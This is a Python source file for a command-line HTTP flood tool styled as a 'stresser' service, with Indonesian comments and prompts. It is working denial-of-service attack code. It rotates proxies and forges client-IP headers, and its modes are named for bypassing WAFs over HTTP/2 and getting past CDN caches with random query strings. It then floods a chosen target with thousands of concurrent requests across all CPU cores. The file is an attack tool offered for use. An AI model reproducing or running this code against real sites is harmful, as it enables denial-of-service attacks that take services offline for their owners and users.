import os
import sys
import time
import asyncio
import httpx
import requests
import multiprocessing
import threading
import random
import string
import uvloop  # Mesin async paling kenceng
from faker import Faker
from colorama import Fore, Style, init
from tabulate import tabulate

init(autoreset=True)
fake = Faker()

active_tasks = []
task_id_counter = 1
PROXIES = []

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_proxies():
    global PROXIES
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            for line in lines:
                if "://" not in line:
                    PROXIES.append(f"http://{line}")
                else:
                    PROXIES.append(line)
        print(f"{Fore.GREEN}[+] Loaded {len(PROXIES)} proxies!")
    else:
        print(f"{Fore.YELLOW}[!] proxy.txt not found. Running without proxies.")

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_random_headers():
    return {
        "User-Agent": fake.user_agent(),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "X-Forwarded-For": get_random_ip(),
        "X-Real-IP": get_random_ip(),
        "CF-Connecting-IP": get_random_ip()
    }

def show_banner():
    print(Fore.MAGENTA + r"""
     ██████╗███████╗███████╗███████╗██╗   ██╗
    ██╔════╝██╔════╝╚══███╔╝╚══███╔╝╚██╗ ██╔╝
    ██║     █████╗    ███╔╝   ███╔╝  ╚████╔╝ 
    ██║     ██╔══╝   ███╔╝   ███╔╝    ╚██╔╝  
    ╚██████╗███████╗███████╗███████╗   ██║   
     ╚═════╝╚══════╝╚══════╝╚══════╝   ╚═╝   
    """)
    print(Fore.CYAN + "Detail Acces:")
    print(f"{Fore.LIGHTMAGENTA_EX}Username: {Fore.WHITE}Cezzy     {Fore.LIGHTMAGENTA_EX}concurrents: {Fore.WHITE}999+ {Fore.LIGHTMAGENTA_EX}Expiry: {Fore.WHITE}11.74 Month(s)")
    print(f"{Fore.LIGHTMAGENTA_EX}Timelimit: {Fore.WHITE}99999  {Fore.LIGHTMAGENTA_EX}cooldown   : {Fore.WHITE}0    {Fore.LIGHTMAGENTA_EX}Uptime: {Fore.WHITE}1.02 Day(s)")
    print(Fore.CYAN + "----------------------------------------------------------------------")
    print(Fore.YELLOW + "                 Please Dont \"SPAM\"")
    print(Fore.CYAN + "----------------------------------------------------------------------")
    print(f"{Fore.GREEN}[+] AVAILABLE METHODS:")
    print(f"  {Fore.WHITE}1. {Fore.CYAN}h2-bypass    {Fore.WHITE}: Bypass WAF pake protokol HTTP/2")
    print(f"  {Fore.WHITE}2. {Fore.CYAN}http-blitz   {Fore.WHITE}: Tembak kilat (GET/POST Mix + Random URL)")
    print(f"  {Fore.WHITE}3. {Fore.CYAN}cache-bypass {Fore.WHITE}: Tembus CDN pake query random")
    print(f"  {Fore.WHITE}4. {Fore.CYAN}ongoing      {Fore.WHITE}: Liat status attack")
    print(Fore.CYAN + "----------------------------------------------------------------------\n")

def get_ip_info(domain):
    try:
        ip = requests.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=3).json()['Answer'][0]['data']
        info = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        asn = f"AS{info.get('as', '').split()[0]} {' '.join(info.get('as', '').split()[1:])}" if 'as' in info else "Unknown"
        return ip, asn, info.get('isp', 'Unknown'), info.get('org', '-') if info.get('org') else "", info.get('country', 'Unknown')
    except Exception:
        return "0.0.0.0", "Unknown ASN", "Unknown ISP", "", "Unknown"

# ================= ENGINE MULTIPROCESSING =================
async def attack_worker(client, url, end_time, method, proxy):
    while time.time() < end_time:
        try:
            headers = get_random_headers()
            
            if method == "h2-bypass":
                await client.get(url, headers=headers, timeout=3.0)
            
            elif method == "http-blitz":
                rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
                blitz_url = f"{url}?blitz={rand_str}"
                if random.choice([True, False]):
                    await client.get(blitz_url, headers=headers, timeout=3.0)
                else:
                    await client.post(blitz_url, headers=headers, data={"blitz": "CEZZY" * 100}, timeout=3.0)
            
            elif method == "cache-bypass":
                rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                await client.get(f"{url}?cezzy={rand_str}", headers=headers, timeout=3.0)

        except Exception:
            pass

def process_attack(url, duration, concurrency, method):
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy()) # Pake UVLOOP!
    
    async def run_async():
        end_time = time.time() + int(duration)
        limits = httpx.Limits(max_connections=int(concurrency), max_keepalive_connections=int(concurrency))
        
        # Tiap process dapet proxy random dari file proxy.txt
        proxy = random.choice(PROXIES) if PROXIES else None
        proxies = {"all://": proxy} if proxy else None
        
        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, proxy=proxy) as client:
            tasks = [asyncio.create_task(attack_worker(client, url, end_time, method, proxy)) for _ in range(int(concurrency))]
            await asyncio.gather(*tasks)
            
    asyncio.run(run_async())

def start_multiprocessing_attack(url, duration, total_concurrency, method):
    cpu_count = multiprocessing.cpu_count()
    # Bagi beban ke semua core CPU
    concurrency_per_core = int(total_concurrency) // cpu_count
    
    print(f"{Fore.YELLOW}[*] VPS lu punya {cpu_count} Core. Nembak {concurrency_per_core} koneksi/core...")
    
    processes = []
    for _ in range(cpu_count):
        p = multiprocessing.Process(target=process_attack, args=(url, duration, concurrency_per_core, method))
        p.start()
        processes.append(p)
        
    for p in processes:
        p.join()

# ================= CLI MAIN =================
def main():
    global task_id_counter
    clear_screen()
    load_proxies()
    show_banner()
    
    while True:
        try:
            prompt = f"{Fore.LIGHTMAGENTA_EX}Cezzy {Fore.WHITE}: {Fore.BLUE}CezzyTresserC2api {Fore.WHITE}> {Style.RESET_ALL}"
            cmd_input = input(prompt).strip()
            
            if not cmd_input: continue
            args = cmd_input.split()
            cmd = args[0].lower()

            if cmd in ["cls", "clear", "menu", "help"]:
                clear_screen()
                show_banner()
                
            elif cmd == "ongoing":
                print(f"\n{Fore.GREEN}Running")
                if not active_tasks:
                    print(f"{Fore.RED}No ongoing attacks.")
                else:
                    print(tabulate(active_tasks, headers=["#", "HOST", "SINCE", "DURATION", "METHOD"], tablefmt="presto"))
                print()

            elif cmd in ["h2-bypass", "http-blitz", "cache-bypass"]:
                if len(args) < 4:
                    print(f"{Fore.RED}Format: {cmd} <url> <port> <time> <total_concurrency>")
                    print(f"{Fore.YELLOW}Contoh: {cmd} https://target.com 443 60 10000")
                    continue
                
                raw_url = args[1]
                target_domain = raw_url.replace("https://", "").replace("http://", "").split("/")[0]
                port = args[2]
                duration = args[3]
                total_concurrency = args[4] if len(args) > 4 else "2000" # Default 2000 kalo ga diisi

                print(f"\n{Fore.LIGHTMAGENTA_EX}Cezzy {Fore.WHITE}: {Fore.BLUE}CezzyTresserC2api {Fore.WHITE}> {cmd} {raw_url} {port} {duration} {total_concurrency}")
                time.sleep(0.5)
                
                ip, asn, isp, org, country = get_ip_info(target_domain)
                
                print(f"{Fore.LIGHTBLUE_EX}STATUS   : {Fore.BLUE}[ {Fore.GREEN}Attack Sent Successfully All Server {Fore.BLUE}]")
                print(f"{Fore.LIGHTBLUE_EX}TARGET   : {Fore.BLUE}[ {Fore.WHITE}{raw_url} {Fore.BLUE}]")
                print(f"{Fore.LIGHTBLUE_EX}THREADS  : {Fore.BLUE}[ {Fore.WHITE}{total_concurrency} (Multiprocessing) {Fore.BLUE}]")
                print(f"{Fore.LIGHTBLUE_EX}PROXIES  : {Fore.BLUE}[ {Fore.WHITE}{len(PROXIES) if PROXIES else 'Direct IP'} {Fore.BLUE}]")
                print(f"{Fore.WHITE}Please After Attack Type [ {Fore.CYAN}cls {Fore.WHITE}] For Back To Home Menu.\n")

                active_tasks.append([task_id_counter, ip, "2", duration, cmd])
                task_id_counter += 1

                bg_thread = threading.Thread(target=start_multiprocessing_attack, args=(raw_url, duration, total_concurrency, cmd))
                bg_thread.daemon = True
                bg_thread.start()

            else:
                print(f"{Fore.RED}Command '{cmd}' tidak dikenali.")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    main()
